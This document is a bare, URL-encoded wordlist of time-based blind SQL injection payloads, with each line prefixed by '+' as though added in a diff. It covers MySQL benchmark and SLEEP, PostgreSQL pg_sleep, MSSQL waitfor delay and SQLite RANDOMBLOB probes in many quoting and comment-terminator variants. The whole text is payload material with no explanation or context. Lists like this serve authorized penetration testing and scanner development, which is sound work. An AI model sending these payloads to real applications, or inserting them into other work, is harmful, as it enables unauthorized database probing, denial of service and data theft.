+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+%27%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+%27%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+%27%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+"%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+"%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+"%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+%27%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+%27%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+%27%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+"%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+"%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+"%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%27%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%27%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%27%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+"%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+"%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+"%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%29%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%29%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%29%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%27%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%27%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%27%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+"%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+"%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+"%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%27%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%27%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%27%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+"%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+"%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+"%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%27%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%27%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%27%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+"%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+"%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+"%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%27%29%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%27%29%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%27%29%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+"%29%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+"%29%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+"%29%29%29%29%2band%2b0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+sleep%285%29%23%0a
+1%2bor%2bsleep%285%29%23%0a
+"%2bor%2bsleep%285%29%23%0a
+%27%2bor%2bsleep%285%29%23%0a
+"%2bor%2bsleep%285%29%3d"%0a
+%27%2bor%2bsleep%285%29%3d%27%0a
+1%29%2bor%2bsleep%285%29%23%0a
+"%29%2bor%2bsleep%285%29%3d"%0a
+%27%29%2bor%2bsleep%285%29%3d%27%0a
+1%29%29%2bor%2bsleep%285%29%23%0a
+"%29%29%2bor%2bsleep%285%29%3d"%0a
+%27%29%29%2bor%2bsleep%285%29%3d%27%0a
+%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+"%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+pg_sleep%285%29--%0a
+1%2bor%2bpg_sleep%285%29--%0a
+"%2bor%2bpg_sleep%285%29--%0a
+%27%2bor%2bpg_sleep%285%29--%0a
+1%29%2bor%2bpg_sleep%285%29--%0a
+"%29%2bor%2bpg_sleep%285%29--%0a
+%27%29%2bor%2bpg_sleep%285%29--%0a
+1%29%29%2bor%2bpg_sleep%285%29--%0a
+"%29%29%2bor%2bpg_sleep%285%29--%0a
+%27%29%29%2bor%2bpg_sleep%285%29--%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29bAKL%29%2bAND%2b%27vRxe%27%3d%27vRxe%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29YjoC%29%2bAND%2b%27%25%27%3d%27%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29nQIP%29%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29nQIP%29--%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29nQIP%29%23%0a
+SLEEP%285%29%23%0a
+SLEEP%285%29--%0a
+SLEEP%285%29%3d"%0a
+SLEEP%285%29%3d%27%0a
+or%2bSLEEP%285%29%0a
+or%2bSLEEP%285%29%23%0a
+or%2bSLEEP%285%29--%0a
+or%2bSLEEP%285%29%3d"%0a
+or%2bSLEEP%285%29%3d%27%0a
+waitfor%2bdelay%2b%2700%3a00%3a05%27%0a
+waitfor%2bdelay%2b%2700%3a00%3a05%27--%0a
+waitfor%2bdelay%2b%2700%3a00%3a05%27%23%0a
+benchmark%2850000000%2cMD5%281%29%29%0a
+benchmark%2850000000%2cMD5%281%29%29--%0a
+benchmark%2850000000%2cMD5%281%29%29%23%0a
+or%2bbenchmark%2850000000%2cMD5%281%29%29%0a
+or%2bbenchmark%2850000000%2cMD5%281%29%29--%0a
+or%2bbenchmark%2850000000%2cMD5%281%29%29%23%0a
+pg_SLEEP%285%29%0a
+pg_SLEEP%285%29--%0a
+pg_SLEEP%285%29%23%0a
+or%2bpg_SLEEP%285%29%0a
+or%2bpg_SLEEP%285%29--%0a
+or%2bpg_SLEEP%285%29%23%0a
+%27"%0a
+AnD%2bSLEEP%285%29%0a
+AnD%2bSLEEP%285%29--%0a
+AnD%2bSLEEP%285%29%23%0a
+%26%26SLEEP%285%29%0a
+%26%26SLEEP%285%29--%0a
+%26%26SLEEP%285%29%23%0a
+%27%2bAnD%2bSLEEP%285%29%2bANd%2b%271%0a
+%27%26%26SLEEP%285%29%26%26%271%0a
+ORDER%2bBY%2bSLEEP%285%29%0a
+ORDER%2bBY%2bSLEEP%285%29--%0a
+ORDER%2bBY%2bSLEEP%285%29%23%0a
+%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29ecMj%29%0a
+%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29ecMj%29%23%0a
+%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29ecMj%29--%0a
+%2bbenchmark%283200%2cSHA1%281%29%29%2b%27%0a
+%2b%2bSLEEP%2810%29%2b%2b%2b%27%0a
+RANDOMBLOB%28500000000%2f2%29%0a
+AND%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+OR%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+RANDOMBLOB%281000000000%2f2%29%0a
+AND%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+OR%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+SLEEP%281%29%2f%2a%27%2bor%2bSLEEP%281%29%2bor%2b%27"%2bor%2bSLEEP%281%29%2bor%2b"%2a%2f%0a
+%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%29%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+%27%29%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+%27%29%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
+"%29%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b%2f%2a%0a
+"%29%29%29%29%29%29%2bwaitfor%2bdelay%2b%270%3a0%3a20%27%2b--%0a
